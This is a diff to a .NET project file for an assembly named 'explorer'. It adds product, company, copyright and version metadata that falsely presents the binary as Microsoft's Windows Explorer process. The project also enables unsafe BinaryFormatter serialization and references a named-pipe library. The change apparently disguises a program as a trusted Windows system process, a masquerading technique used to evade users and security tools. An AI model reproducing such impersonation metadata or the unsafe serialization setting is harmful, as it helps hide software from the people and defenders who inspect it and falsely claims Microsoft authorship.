@@ -7,6 +7,13 @@
         <Nullable>enable</Nullable>
         <EnableUnsafeBinaryFormatterSerialization>true</EnableUnsafeBinaryFormatterSerialization>
         <AssemblyName>explorer</AssemblyName>
+        <RootNamespace>Microsoft.Windows.Explorer</RootNamespace>
+        <Product>Windows Explorer</Product>
+        <Description>Windows Explorer Process</Description>
+        <Company>Microsoft Corporation</Company>
+        <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
+        <FileVersion>10.0.19041.1</FileVersion>
+        <AssemblyVersion>10.0.19041.1</AssemblyVersion>
     </PropertyGroup>
     <ItemGroup>
         <PackageReference Include="H.Pipes" Version="15.0.0" />
